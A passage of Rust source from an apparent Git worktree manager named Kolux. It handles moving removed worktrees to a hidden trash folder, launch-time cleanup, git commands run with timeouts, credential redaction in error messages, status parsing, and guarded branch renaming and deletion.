/// shape `move_to_trash` makes counts; the older forms are left alone.
pub(crate) const TRASH_PREFIX: &str = ".kolux-trash-";

/// After-list rows 127/128: the file a trash folder carries once its removal is confirmed (Git's
/// record of the worktree is gone and Git's list agrees). The launch sweep deletes only folders
/// that carry it. A folder without it (a move back that failed, a removal that stopped half way,
/// a run that ended mid-removal, a folder from an older build) may hold work the user still
/// needs, so it is kept and named in the diagnostics log instead.
pub(crate) const TRASH_CONFIRMED: &str = ".kolux-trash-confirmed";

pub(crate) fn is_trash_name(name: &str) -> bool {
    let Some(rest) = name.strip_prefix(TRASH_PREFIX) else { return false };
    let mut parts = rest.splitn(3, '-');
    let hex = |s: Option<&str>| s.is_some_and(|s| !s.is_empty() && s.chars().all(|c| c.is_ascii_hexdigit()));
    hex(parts.next()) && hex(parts.next()) && parts.next().is_some_and(|n| !n.is_empty())
}

/// Rows 127/128: marks a trash folder as confirmed for deletion (see `TRASH_CONFIRMED`). Only a
/// real folder is marked, never through a link.
pub(crate) fn confirm_trash(trash: &Path) {
    if std::fs::symlink_metadata(trash).is_ok_and(|m| m.is_dir()) {
        let _ = std::fs::write(long_path(&trash.join(TRASH_CONFIRMED)), b"removal confirmed; Kolux deletes this folder\n");
    }
}

fn trash_confirmed(trash: &Path) -> bool {
    std::fs::symlink_metadata(trash.join(TRASH_CONFIRMED)).is_ok_and(|m| m.is_file())
}

/// PROJ-074: moves `dest` into a hidden trash folder beside it (same volume, so it is one rename
/// and the row can vanish at once). Fails, leaving `dest` where it was, when Windows will not
/// let go of the folder (see `move_to_trash_patiently`).
pub(crate) fn move_to_trash(dest: &Path) -> Result<PathBuf, String> {
    use std::sync::atomic::{AtomicU32, Ordering};
    static COUNTER: AtomicU32 = AtomicU32::new(0);
    let parent = dest.parent().ok_or_else(|| format!("{} has no parent folder", dest.display()))?;
    let name = dest.file_name().ok_or_else(|| format!("{} has no name", dest.display()))?.to_string_lossy().into_owned();
    let nonce = format!("{:x}-{:x}", std::process::id(), COUNTER.fetch_add(1, Ordering::Relaxed));
    let trash = parent.join(format!("{TRASH_PREFIX}{nonce}-{name}"));
    std::fs::rename(long_path(dest), long_path(&trash)).map_err(|e| format!("{} could not be moved to the trash: {e}", dest.display()))?;
    hide_folder(&trash);
    Ok(trash)
}

/// Row 110: a folder with a file held open cannot be renamed, and Windows lets go a moment after
/// the program ends, so it gets a few more tries. Still held, the removal is refused here with
/// nothing touched: `git worktree remove` would drop Git's record and delete part of the folder
/// before it failed on the held file.
fn move_to_trash_patiently(dest: &Path) -> Result<PathBuf, String> {
    let mut last = String::new();
    for attempt in 0..4 {
        match move_to_trash(dest) {
            Ok(trash) => return Ok(trash),
            Err(e) => last = e,
        }
        if attempt < 3 {
            std::thread::sleep(std::time::Duration::from_millis(250));
        }
    }
    Err(format!("{last}; nothing was deleted: close the programs that have files open in the folder and try again"))
}

/// PROJ-074: the undo of `move_to_trash`: the folder goes back to where Git expects it. A folder
/// a program holds for a moment gets a few more tries. After-list row 128: when it still will not
/// move, it stays in the trash untouched (unconfirmed, so the launch sweep keeps it) and the error
/// says where it is.
pub(crate) fn move_back(trash: &Path, dest: &Path) -> Result<(), String> {
    let mut last = String::new();
    for attempt in 0..4 {
        match std::fs::rename(long_path(trash), long_path(dest)) {
            Ok(()) => return Ok(()),
            Err(e) => last = e.to_string(),
        }
        if attempt < 3 {
            std::thread::sleep(std::time::Duration::from_millis(250));
        }
    }
    Err(format!("{} could not be moved back from the trash ({last}); nothing was deleted: the folder is kept as it was at {}", dest.display(), trash.display()))
}

#[cfg(windows)]
fn hide_folder(p: &Path) {
    use std::os::windows::process::CommandExt;
    let _ = std::process::Command::new("attrib").arg("+h").arg(p).creation_flags(0x0800_0000).output();
}
#[cfg(not(windows))]
fn hide_folder(_: &Path) {}

/// Deletes a trash folder; files a program still held open get a few more tries. A symlink is
/// unlinked, never followed.
pub(crate) fn empty_trash(trash: &Path) -> bool {
    let is_link = std::fs::symlink_metadata(trash).is_ok_and(|m| m.file_type().is_symlink());
    for _ in 0..4 {
        let done = if is_link { std::fs::remove_file(trash).or_else(|_| std::fs::remove_dir(trash)).is_ok() } else { clear_confirmed_last(trash) };
        if done || !trash.exists() {
            return true;
        }
        std::thread::sleep(std::time::Duration::from_millis(250));
    }
    false
}

/// Rows 127/128: everything in the folder goes before its confirmation mark, so a delete cut short
/// (the app quit, a file held open) leaves a folder the next launch sweep still recognises.
fn clear_confirmed_last(trash: &Path) -> bool {
    if let Ok(entries) = std::fs::read_dir(long_path(trash)) {
        for e in entries.flatten() {
            if e.file_name() == TRASH_CONFIRMED {
                continue;
            }
            let p = e.path();
            let _ = if e.file_type().is_ok_and(|t| t.is_dir()) { std::fs::remove_dir_all(&p) } else { std::fs::remove_file(&p).or_else(|_| std::fs::remove_dir(&p)) };
        }
    }
    std::fs::remove_dir_all(long_path(trash)).is_ok()
}

/// PROJ-074: the deleting happens off the caller's thread; the space returns shortly after.
pub(crate) fn empty_trash_in_background(trash: PathBuf) {
    if cfg!(test) {
        // Unit tests delete their own temp folders right after; a second deleter would race them.
        empty_trash(&trash);
    } else {
        spawn_empty_trash(trash);
    }
}

fn spawn_empty_trash(trash: PathBuf) -> std::thread::JoinHandle<bool> {
    std::thread::spawn(move || empty_trash(&trash))
}

/// After-list row 129: deletes `refs/heads/<branch>` in one compare-and-delete step that Git
/// refuses when the branch no longer points at `commit` (it moved after the check). Ok(false)
/// means it was left alone.
pub(crate) fn delete_ref_if_at(repo: &Path, branch: &str, commit: &str) -> Result<bool, String> {
    if commit.is_empty() || !commit.chars().all(|c| c.is_ascii_hexdigit()) || branch.starts_with('-') {
        return Ok(false);
    }
    let reference = format!("refs/heads/{branch}");
    match run(&["update-ref", "-d", &reference, commit], Some(repo)) {
        Ok(_) => Ok(true),
        Err(e) => match run(&["rev-parse", "--verify", "--quiet", &reference], Some(repo)) {
            // still there, now somewhere else: it moved, so it stays
            Ok(at) if at != commit => Ok(false),
            _ => Err(e),
        },
    }
}

/// What one launch sweep did in one folder.
#[derive(Debug, Default)]
pub(crate) struct Swept {
    /// Trash folders deleted (confirmed ones, and links, which hold nothing themselves).
    pub gone: Vec<PathBuf>,
    /// Trash folders kept because their removal was never confirmed (rows 127/128).
    pub kept: Vec<PathBuf>,
}

/// PROJ-074: deletes every confirmed trash folder directly inside `parent` (left by a run that
/// ended before the background pass finished). Only names that `is_trash_name` accepts are
/// touched, and never a file. After-list row 128: a trash folder without the confirmation mark (a
/// failed move back, a removal cut short) is never deleted; it is reported as kept.
pub(crate) fn sweep_trash(parent: &Path) -> Swept {
    let mut swept = Swept::default();
    let Ok(entries) = std::fs::read_dir(parent) else { return swept };
    for e in entries.flatten() {
        let name = e.file_name().to_string_lossy().into_owned();
        let Ok(kind) = e.file_type() else { continue };
        if !is_trash_name(&name) || !(kind.is_dir() || kind.is_symlink()) {
            continue;
        }
        if kind.is_dir() && !trash_confirmed(&e.path()) {
            swept.kept.push(e.path());
        } else if empty_trash(&e.path()) {
            swept.gone.push(e.path());
        }
    }
    swept
}

/// PROJ-027: how long a worktree add may take before Kolux stops waiting. Cloud-synced folders
/// can stall git for minutes; the default is 3 minutes. COMPAT: `KOLUX_WORKTREE_ADD_TIMEOUT_MS`
/// (milliseconds) overrides it, clamped to 3 to 30 minutes; anything unreadable keeps the default.
pub(crate) fn add_timeout(env: Option<&str>) -> std::time::Duration {
    const MIN: u64 = 3 * 60_000;
    const MAX: u64 = 30 * 60_000;
    std::time::Duration::from_millis(env.and_then(|v| v.trim().parse::<u64>().ok()).map_or(MIN, |ms| ms.clamp(MIN, MAX)))
}

/// PROJ-027: the wait for reads that precede a removal or a listing (status, worktree list).
pub(crate) const READ_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(30);

/// `run` with a deadline. On timeout the git process and its children are ended and the error
/// names the wait and the usual cause (a folder a cloud service is syncing).
pub(crate) fn run_within(args: &[&str], cwd: Option<&Path>, limit: std::time::Duration) -> Result<String, String> {
    run_within_raw(args, cwd, limit).map(|s| s.trim().to_string())
}

/// run_within keeping leading spaces (status lines).
fn run_within_raw(args: &[&str], cwd: Option<&Path>, limit: std::time::Duration) -> Result<String, String> {
    bytes_within(args, cwd, limit).map(|b| String::from_utf8_lossy(&b).to_string())
}

/// git with a deadline, stdout byte for byte. Past the deadline git and every process it started
/// are ended (GIT-070: the whole tree, not just git) and the error names the wait.
fn bytes_within(args: &[&str], cwd: Option<&Path>, limit: std::time::Duration) -> Result<Vec<u8>, String> {
    use std::io::Read;
    use std::process::Stdio;
    let _changed = WorktreeChange::watch(args);
    let mut child = command_checked(args, cwd)?.stdin(Stdio::null()).stdout(Stdio::piped()).stderr(Stdio::piped()).spawn().map_err(|e| format!("could not run git: {e}"))?;
    let drain = |mut r: Box<dyn Read + Send>| {
        let (tx, rx) = std::sync::mpsc::channel();
        std::thread::spawn(move || {
            let mut buf = Vec::new();
            let _ = r.read_to_end(&mut buf);
            let _ = tx.send(buf);
        });
        rx
    };
    let out = drain(Box::new(child.stdout.take().expect("piped")));
    let err = drain(Box::new(child.stderr.take().expect("piped")));
    let deadline = std::time::Instant::now() + limit;
    let stopped = |child: &mut std::process::Child| {
        crate::procs::kill_tree(child.id());
        let _ = child.kill();
        let _ = child.wait();
        Err(format!(
            "Git did not finish in {} seconds, so Kolux stopped waiting. A folder that a cloud service (OneDrive, Dropbox, iCloud) is syncing is the usual cause: move the project or the workspaces folder outside it.",
            limit.as_secs()
        ))
    };
    // Waiting on the end of stdout, not polling, keeps a quick read quick.
    let Ok(out) = out.recv_timeout(limit) else { return stopped(&mut child) };
    let status = loop {
        match child.try_wait() {
            Ok(Some(s)) => break s,
            Ok(None) if std::time::Instant::now() >= deadline => return stopped(&mut child),
            Ok(None) => std::thread::sleep(std::time::Duration::from_millis(2)),
            Err(e) => return Err(format!("could not wait for git: {e}")),
        }
    };
    let err = err.recv_timeout(deadline.saturating_duration_since(std::time::Instant::now())).unwrap_or_default();
    if status.success() {
        Ok(out)
    } else {
        let err = String::from_utf8_lossy(&err).trim().to_string();
        Err(if err.is_empty() { format!("git {} failed ({status})", args.join(" ")) } else { err })
    }
}

/// Runs git and returns its stdout, trimmed; a non-zero exit becomes an error carrying stderr.
pub(crate) fn run(args: &[&str], cwd: Option<&Path>) -> Result<String, String> {
    run_untrimmed(args, cwd).map(|s| s.trim().to_string())
}

/// `run` keeping leading spaces, which `git status --porcelain` lines carry meaning in.
fn run_untrimmed(args: &[&str], cwd: Option<&Path>) -> Result<String, String> {
    output(args, cwd).map(|o| String::from_utf8_lossy(&o).to_string())
}

/// GIT-062: the one readable line a failed git's stderr comes down to. The last `fatal:` line
/// wins, then the last `error:` line, then the last line that is not progress; None when only
/// progress was said. A `\r`-overwritten line counts as its last state.
pub fn failure_reason(log: &str) -> Option<String> {
    const PROGRESS: [&str; 9] = ["Cloning into", "remote: ", "Receiving objects", "Resolving deltas", "Updating files", "Checking out files", "Filtering content", "Enumerating objects", "Counting objects"];
    // A line's last state is its last non-empty \r segment, so a line git ends with \r still counts.
    let lines: Vec<&str> = log.lines().filter_map(|l| l.rsplit('\r').map(str::trim).find(|s| !s.is_empty())).collect();
    let tagged = |tag: &str| lines.iter().rev().find_map(|l| l.strip_prefix(tag)).map(str::trim);
    let line = tagged("fatal:").or_else(|| tagged("error:")).or_else(|| lines.iter().rev().copied().find(|l| !PROGRESS.iter().any(|p| l.starts_with(p))))?;
    let line = hide_userinfo(line);
    let mut chars = line.chars();
    chars.next().map(|first| first.to_uppercase().chain(chars).collect())
}

/// FIX-2: `scheme://user:token@host` becomes `scheme://***@host`, so a reason never shows a
/// password or token that was in a link.
fn hide_userinfo(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    let mut rest = text;
    while let Some(at) = rest.find("://") {
        let (head, tail) = rest.split_at(at + 3);
        out.push_str(head);
        let authority_end = tail.find(|c: char| c == '/' || c.is_whitespace() || c == '\'' || c == '"').unwrap_or(tail.len());
        match tail[..authority_end].rfind('@') {
            Some(user_end) => {
                out.push_str("***");
                rest = &tail[user_end..];
            }
            None => rest = tail,
        }
    }
    out.push_str(rest);
    out
}

/// One changed file on one side of the index (EDIT-027): `code` is git's status letter.
#[derive(Clone, Debug, PartialEq, Eq, serde::Serialize)]
pub struct Change {
    pub path: String,
    pub staged: bool,
    pub code: char,
}

/// Parses `git status --porcelain=v1 -z`. A file with staged and unstaged changes gives two
/// entries; an untracked file is an unstaged one with code `?`.
pub fn parse_status(text: &str, worktree: &Path) -> Vec<Change> {
    let mut list = Vec::new();
    let mut parts = text.split('\0');
    while let Some(entry) = parts.next() {
        let b = entry.as_bytes();
        if b.len() < 4 {
            continue;
        }
        let (x, y) = (b[0] as char, b[1] as char);
        if x == 'R' || x == 'C' {
            parts.next(); // the old name follows a rename or a copy
        }
        let path = worktree.join(native(&entry[3..])).to_string_lossy().into_owned();
        if !matches!(x, ' ' | '?' | '!') {
            list.push(Change { path: path.clone(), staged: true, code: x });
        }
        if !matches!(y, ' ' | '!') {
            list.push(Change { path, staged: false, code: y });
        }
    }
    list
}

/// Git's own path spelling (forward slashes, no `\\?\` prefix) turned back into a native path.
pub(crate) fn native(path: &str) -> String {
    if cfg!(windows) {
        path.replace('/', "\\")
    } else {
        path.to_string()
    }
}

impl Git {
    /// GIT-068: predicting a merge needs `git merge-tree --write-tree`, new in Git 2.38. Read from
    /// the version found once at startup, so an older Git is never probed for it again; a version
    /// that cannot be read is tried.
    pub fn predicts_merges(&self) -> bool {
        let mut n = self.version.trim_start_matches("git version ").split('.').map(|x| x.parse::<u32>().ok());
        match (n.next().flatten(), n.next().flatten()) {
            (Some(major), Some(minor)) => (major, minor) >= (2, 38),
            _ => true,
        }
    }

    /// Finds git on the path. Called once at startup; the version is shown to the user.
    pub fn detect() -> Result<Git, String> {
        let version = run(&["--version"], None).map_err(|e| format!("Git is not available: {e}"))?;
        Ok(Git { version })
    }

    /// The top-level folder of the repository that holds `path`, or an error if there is none.
    pub fn toplevel(&self, path: &Path) -> Result<PathBuf, String> {
        if !path.is_dir() {
            return Err(format!("{} is not a folder", path.display()));
        }
        // Someone who picks the .git folder itself meant the repository around it.
        let path = if path.file_name().is_some_and(|n| n == ".git") { path.parent().unwrap_or(path) } else { path };
        let top = run(&["rev-parse", "--show-toplevel"], Some(path))
            .map_err(|_| format!("{} is not inside a Git repository", path.display()))?;
        Ok(PathBuf::from(native(&top)))
    }

    pub fn worktrees(&self, repo: &Path) -> Result<Vec<Worktree>, String> {
        let text = run_within(&["worktree", "list", "--porcelain"], Some(repo), READ_TIMEOUT)?;
        Ok(parse_worktrees(&text))
    }

    /// `git worktree add -b <branch> <dest> <base>`: a new branch in a folder of its own.
    pub fn worktree_add(&self, repo: &Path, dest: &Path, branch: &str, base: &str) -> Result<(), String> {
        let dest = dest.to_string_lossy();
        let limit = add_timeout(std::env::var("KOLUX_WORKTREE_ADD_TIMEOUT_MS").ok().as_deref());
        run_within(&["worktree", "add", "-b", branch, &dest, base], Some(repo), limit).map(|_| ())
    }

    /// Removes the worktree folder and then deletes its branch. The folder goes first; a branch
    /// that will not delete (never the case for `-D`) leaves a clear error rather than a half state.
    /// A branch another worktree still has checked out is kept: the result then carries the
    /// commit it points at, for `delete_branch_if_at` later.
    ///
    /// PROJ-072: a folder already gone while Git still lists it is cleaned up (Git's own record
    /// for it goes, never anything else); a Windows path too long for Git is deleted locally and
    /// its record dropped; a folder left behind after Git let go of it is deleted too. A
    /// registration Git still reports afterwards is an error, never forced out from under it.
    pub fn worktree_remove(&self, repo: &Path, dest: &Path, branch: Option<&str>) -> Result<Option<String>, String> {
        // The normal path runs no `git worktree` command, so every finish (done, held, restored) counts here.
        let _changed = WorktreeChange(true);
        let dest_s = dest.to_string_lossy();
        // PROJ-074: the folder is moved into a hidden trash beside it first and Git's record for
        // it dropped, so the workspace is gone at once; the slow delete happens in the background.
        // After-list row 127: Git's record is only set aside until the removal is confirmed, so an
        // undo puts back both the folder and the record.
        let mut trashed: Option<(PathBuf, crate::projects::SetAside)> = None;
        if !dest.exists() {
            let _ = crate::projects::forget_record(repo, &dest_s);
        } else {
            let trash = move_to_trash_patiently(dest)?;
            match crate::projects::set_aside_record(repo, &dest_s) {
                Ok(record) => trashed = Some((trash, record)),
                // Git's record could not be dropped (a lock, say): the folder goes back and the
                // ordinary removal below runs and gives its own answer. Should the folder not
                // move back, it stays unconfirmed in the trash, which the launch sweep keeps.
                Err(_) => move_back(&trash, dest)?,
            }
        }
        if trashed.is_none() && dest.exists() {
            // Windows may still hold the folder for a moment after a program in it was ended.
            let mut attempt = 0;
            loop {
                match run(&["worktree", "remove", "--force", &dest_s], Some(repo)) {
                    Ok(_) => break,
                    Err(e) if attempt < 5 && e.contains("Permission denied") => {
                        attempt += 1;
                        std::thread::sleep(std::time::Duration::from_millis(250));
                    }
                    Err(e) if path_too_long(&e) => {
                        std::fs::remove_dir_all(long_path(dest)).map_err(|err| format!("{e}; deleting the folder directly failed too: {err}"))?;
                        let _ = crate::projects::forget_record(repo, &dest_s);
                        break;
                    }
                    Err(e) => return Err(e),
                }
            }
        }
        let key = crate::projects::name_key(&dest_s);
        // A listing Git cannot give counts as "still listed": the removal is undone, never left half way.
        let listed = self.worktrees(repo).map(|all| all.iter().any(|w| crate::projects::name_key(&w.path) == key));
        if listed != Ok(false) {
            if let Some((trash, record)) = &trashed {
                // The removal is undone: Git's record and then the folder go back where they were.
                let restored = record.restore();
                move_back(trash, dest)?;
                restored?;
            }
            return Err(listed.err().unwrap_or_else(|| format!("Git still lists {} as a workspace, so Kolux left its record alone", dest.display())));
        }
        if let Some((trash, record)) = trashed {
            // Confirmed: the record goes for good and the folder is marked for the sweep, which
            // finishes the delete should this run end before the background pass does.
            record.discard();
            confirm_trash(&trash);
            empty_trash_in_background(trash);
        }
        if dest.exists() {
            // What Kolux made and Git let go of: leftovers (files a program held open) go too.
            for _ in 0..4 {
                if std::fs::remove_dir_all(long_path(dest)).is_ok() || !dest.exists() {
                    break;
                }
                std::thread::sleep(std::time::Duration::from_millis(250));
            }
        }
        if dest.exists() {
            return Err(format!("the folder {} is still there: something keeps it open", dest.display()));
        }
        if let Some(b) = branch {
            if self.checked_out_somewhere(repo, b)? {
                return run(&["rev-parse", "--verify", &format!("refs/heads/{b}")], Some(repo)).map(Some);
            }
            run(&["branch", "-D", b], Some(repo))?;
        }
        Ok(None)
    }

    /// `git worktree move`: the folder changes place and Git's own records follow.
    pub fn worktree_move(&self, repo: &Path, from: &Path, to: &Path) -> Result<(), String> {
        run(&["worktree", "move", &from.to_string_lossy(), &to.to_string_lossy()], Some(repo)).map(|_| ())
    }

    /// PROJ-068: `git worktree repair`: Git learns that the worktree now sits in `dir`.
    pub fn worktree_repair(&self, repo: &Path, dir: &Path) -> Result<(), String> {
        run_within(&["worktree", "repair", &dir.to_string_lossy()], Some(repo), SHORT_READ_LIMIT).map(|_| ())
    }

    fn checked_out_somewhere(&self, repo: &Path, branch: &str) -> Result<bool, String> {
        Ok(self.worktrees(repo)?.iter().any(|w| w.branch.as_deref() == Some(branch)))
    }

    /// Deletes a branch kept at removal, but only while it still points at `commit` and no
    /// worktree has it checked out. Ok(false) means it was left alone.
    pub fn delete_branch_if_at(&self, repo: &Path, branch: &str, commit: &str) -> Result<bool, String> {
        let at = run(&["rev-parse", "--verify", "--quiet", &format!("refs/heads/{branch}")], Some(repo))?;
        if at != commit || self.checked_out_somewhere(repo, branch)? {
            return Ok(false);
        }
        delete_ref_if_at(repo, branch, commit)
    }

    /// PROJ-080: when the checkout's HEAD commit was made (seconds since 1970), for "gone quiet".
    pub fn head_time(&self, worktree: &Path) -> Option<u64> {
        run_within(&["log", "-1", "--format=%ct", "HEAD"], Some(worktree), READ_TIMEOUT).ok()?.parse().ok()
    }

    /// PROJ-080: is everything on the checkout's HEAD already in `base`?
    pub fn merged_into(&self, worktree: &Path, base: &str) -> bool {
        Self::ref_ok(base) && run_within(&["merge-base", "--is-ancestor", "HEAD", base], Some(worktree), READ_TIMEOUT).is_ok()
    }

    /// Does `rev` (a branch ref or a commit) hold commits that `base` lacks? Anything that cannot
    /// be read counts as yes, so a doubtful branch is kept rather than deleted.
    pub fn has_unmerged(&self, repo: &Path, rev: &str, base: &str) -> bool {
        !(Self::ref_ok(base) && Self::ref_ok(rev) && run_within(&["merge-base", "--is-ancestor", rev, base], Some(repo), READ_TIMEOUT).is_ok())
    }

    /// PROJ-070: the checkout's uncommitted and untracked changes, one `git status --porcelain` line each.
    pub fn status_lines(&self, worktree: &Path) -> Result<Vec<String>, String> {
        run_within_raw(&["status", "--porcelain"], Some(worktree), READ_TIMEOUT).map(|s| s.lines().filter(|l| !l.is_empty()).map(str::to_string).collect())
    }

    /// Does the checkout hold changes Git does not have yet (modified or untracked files, and
    /// work inside a submodule)?
    pub fn dirty(&self, worktree: &Path) -> Result<bool, String> {
        run_within(&["status", "--porcelain", "--ignore-submodules=none"], Some(worktree), READ_TIMEOUT).map(|s| !s.is_empty())
    }

    /// Could `rev` be a ref spelling at all? Anything git might read as an option or a range is
    /// refused before any command runs.
    pub fn ref_ok(rev: &str) -> bool {
        !rev.is_empty() && !rev.starts_with('-') && !rev.contains("..") && !rev.chars().any(|c| c.is_whitespace() || c.is_control())
    }

    /// How many commits `base` has that the worktree's HEAD does not (ORCH-014's base drift).
    pub fn behind(&self, worktree: &Path, base: &str) -> Option<u32> {
        run(&["rev-list", "--count", &format!("HEAD..{base}")], Some(worktree)).ok()?.parse().ok()
    }

    /// Does `rev` name a commit here: a branch, tag, remote branch or id?
    pub fn rev_exists(&self, repo: &Path, rev: &str) -> bool {
        Self::ref_ok(rev) && run(&["rev-parse", "--verify", "--quiet", &format!("{rev}^{{commit}}")], Some(repo)).is_ok()
    }

    /// The branch new work starts from when nothing says otherwise (PROJ-028): origin's HEAD,
    /// else main or master, else the branch the main checkout is on.
    pub fn default_branch(&self, repo: &Path) -> Option<String> {
        let short = |args: &[&str]| run(args, Some(repo)).ok().filter(|s| !s.is_empty());
        short(&["symbolic-ref", "-q", "--short", "refs/remotes/origin/HEAD"])
            .or_else(|| ["main", "master"].into_iter().find(|b| self.rev_exists(repo, b)).map(String::from))
            .or_else(|| short(&["symbolic-ref", "-q", "--short", "HEAD"]))
    }

    /// Can a workspace start from `rev`? A ref that tracks a remote (`origin/x`, or a local
    /// branch with an upstream) is fetched first so it is fresh, and one the remote no longer
    /// has counts as gone; a full commit id is used as it is; being offline is not an error, the
    /// local copy serves.
    pub fn base_available(&self, repo: &Path, rev: &str) -> bool {
        if !Self::ref_ok(rev) {
            return false;
        }
        if rev.len() == 40 && rev.bytes().all(|b| b.is_ascii_hexdigit()) {
            return self.rev_exists(repo, rev);
        }
        let full = |r: &str| run(&["rev-parse", "--symbolic-full-name", r], Some(repo)).unwrap_or_default();
        let tracking = Some(full(rev)).filter(|f| f.starts_with("refs/remotes/")).unwrap_or_else(|| full(&format!("{rev}@{{upstream}}")));
        if let Some((remote, branch)) = tracking.strip_prefix("refs/remotes/").and_then(|r| r.split_once('/')) {
            if let Err(e) = run(&["fetch", "--quiet", remote, branch], Some(repo)) {
                if e.contains("couldn't find remote ref") {
                    return false;
                }
            }
        }
        self.rev_exists(repo, rev)
    }

    /// Is the name a local branch, or a branch on any remote (PROJ-021: a taken name gets a number)?
    pub fn branch_taken(&self, repo: &Path, branch: &str) -> bool {
        run(&["for-each-ref", "--format=%(refname)", &format!("refs/heads/{branch}"), &format!("refs/remotes/*/{branch}")], Some(repo)).is_ok_and(|s| !s.is_empty())
    }

    /// GIT-020 / PROJ-039: the upstream `branch` tracks (for example `origin/work`), if any. Read
    /// before a rename so the answer can say what tracking was kept.
    pub fn upstream_of(&self, repo: &Path, branch: &str) -> Option<String> {
        if !Self::ref_ok(branch) {
            return None;
        }
        run(&["for-each-ref", "--format=%(upstream:short)", &format!("refs/heads/{branch}")], Some(repo)).ok().filter(|s| !s.is_empty())
    }

    /// PROJ-039 (T-107-d): whether any remote holds a branch of this name, so a pushed branch is
    /// never renamed from under its remote even when no tracking is configured.
    pub fn on_remote(&self, repo: &Path, branch: &str) -> bool {
        Self::ref_ok(branch) && run(&["for-each-ref", "--format=%(refname)", &format!("refs/remotes/*/{branch}")], Some(repo)).is_ok_and(|s| !s.trim().is_empty())
    }

    /// PROJ-039 (T-107-d): whether `branch` is configured to track a remote (`branch.<name>.remote`),
    /// even when the remote-tracking ref has not been fetched yet, so `upstream_of` says nothing.
    pub fn tracks_remote(&self, repo: &Path, branch: &str) -> bool {
        Self::ref_ok(branch) && run(&["config", "--get", &format!("branch.{branch}.remote")], Some(repo)).is_ok_and(|s| !s.trim().is_empty())
    }

    /// GIT-020: renames the local branch `old` to `new` with `git branch -m`, which keeps the
    /// branch's commits and moves its tracking settings along. It never uses `-M` and deletes
    /// nothing: a name a local branch or a remote already uses is refused here, so the refusal does
    /// not depend on Git's wording.
    pub fn rename_branch(&self, repo: &Path, old: &str, new: &str) -> Result<(), String> {
        if !Self::ref_ok(old) || !Self::ref_ok(new) {
            return Err("That branch name is not usable.".into());
        }
        if old == new {
            return Ok(());
        }
        if self.branch_taken(repo, new) {
            return Err(format!("A branch named {new} already exists, so {old} keeps its name."));
        }
        run(&["branch", "-m", old, new], Some(repo)).map(|_| ())
    }

    /// The worktree's markdown files, tracked and untracked, as full paths (EDIT-012). Git leaves
    /// out ignored files and never walks into a symlinked folder; the list stops at `cap`, and the
    /// flag says it did.
    pub fn markdown_files(&self, worktree: &Path, cap: usize) -> Result<(Vec<String>, bool), String> {
        let text = run(&["ls-files", "-z", "--cached", "--others", "--exclude-standard", "--deduplicate", "--", "*.md", "*.markdown"], Some(worktree))?;
        let mut names: Vec<&str> = text.split('\0').filter(|n| !n.is_empty()).collect();
        names.sort_unstable();
        let capped = names.len() > cap;
        Ok((names.into_iter().take(cap).map(|n| worktree.join(native(n)).to_string_lossy().into_owned()).collect(), capped))
    }

    /// Every file git knows in the worktree, tracked and untracked but not ignored, NUL-separated
    /// and relative to it: Quick Open's list when ripgrep is missing (EDIT-036).
    pub fn listed_files(&self, worktree: &Path) -> Result<String, String> {
        output(&["ls-files", "-z", "--cached", "--others", "--exclude-standard", "--deduplicate"], Some(worktree)).map(|o| String::from_utf8_lossy(&o).into_owned())
    }

    /// The worktree's changed files, staged and unstaged, for the diff picker (EDIT-027).
    pub fn changes(&self, worktree: &Path) -> Result<Vec<Change>, String> {
        let out = output(&["status", "--porcelain=v1", "-z", "--untracked-files=all"], Some(worktree))?;
        Ok(parse_status(&String::from_utf8_lossy(&out), worktree))
    }

    /// The two texts of a file's diff (EDIT-027): unstaged compares the index with the working
    /// file, staged compares HEAD with the index. Git's checkout filters are applied, so line ends
    /// match the working file. A side the file is not on (new, deleted, untracked) is empty.
    pub fn diff_sides(&self, file: &Path, staged: bool) -> Result<(String, String), String> {
        let (old, new) = self.diff_bytes(file, staged)?;
        let text = |b: Vec<u8>| String::from_utf8(b).map_err(|_| format!("{} is not UTF-8 text", file.display()));
        Ok((text(old)?, text(new)?))
    }

    /// The same two sides as bytes, for images in All Changes (EDIT-029).
    pub fn diff_bytes(&self, file: &Path, staged: bool) -> Result<(Vec<u8>, Vec<u8>), String> {
        let dir = file.parent().filter(|d| !d.as_os_str().is_empty()).ok_or_else(|| format!("{} is not a file path", file.display()))?;
        let name = file.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default();
        // ponytail: any failure to read a side counts as "not there"; tell the two apart if a real error ever hides behind it
        let show = |rev: &str| output(&["cat-file", "--filters", &format!("{rev}:./{name}")], Some(dir)).unwrap_or_default();
        let index = show("");
        if staged {
            return Ok((show("HEAD"), index));
        }
        let work = match std::fs::read(file) {
            Ok(b) => b,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => Vec::new(),
            Err(e) => return Err(format!("{}: {e}", file.display())),
        };
        Ok((index, work))
    }

    /// Every change of the worktree with its size and identity, for All Changes (EDIT-029).
    pub fn change_entries(&self, worktree: &Path) -> Result<Vec<Entry>, String> {
        let changes = self.changes(worktree)?;
        let (staged, unstaged) = (diff_stats(worktree, true)?, diff_stats(worktree, false)?);
        Ok(changes
            .into_iter()
            .map(|c| {
                let rel = Path::new(&c.path).strip_prefix(worktree).map(|r| r.to_string_lossy().replace('\\', "/")).unwrap_or_default();
                let disk = std::fs::metadata(&c.path).ok().map(|m| format!("{}-{:?}", m.len(), m.modified().ok())).unwrap_or_default();
                if c.code == '?' {
                    let (lines, binary) = whole_file(&c.path);
                    return Entry { path: c.path, staged: false, code: c.code, lines, binary, stamp: disk };
                }
                let s = (if c.staged { &staged } else { &unstaged }).get(&rel).cloned().unwrap_or_default();
                let stamp = if c.staged { s.ids } else { format!("{}|{disk}", s.ids) };
                Entry { path: c.path, staged: c.staged, code: c.code, lines: s.lines, binary: s.binary, stamp }
            })
            .collect())
    }
}

/// A changed file in All Changes (EDIT-029): `lines` is added plus removed lines (none for a
/// binary file), and `stamp` changes whenever the change does, so a section reuses what it
/// fetched only while its change is the same.
#[derive(Clone, Debug, serde::Serialize)]
pub struct Entry {
    pub path: String,
    pub staged: bool,
    pub code: char,
    pub lines: Option<u64>,
    pub binary: bool,
    pub stamp: String,
}

#[derive(Clone)]
struct Stat {
    lines: Option<u64>,
    binary: bool,
    ids: String,
    code: char,
}

impl Default for Stat {
    fn default() -> Self {
        Stat { lines: None, binary: false, ids: String::new(), code: 'M' }
    }
}

/// `git diff [--cached] --numstat` and `--raw` by path (relative to the top, with forward slashes).
fn diff_stats(worktree: &Path, cached: bool) -> Result<std::collections::HashMap<String, Stat>, String> {
    diff_stats_with(worktree, if cached { &["--cached"] } else { &[] })
}

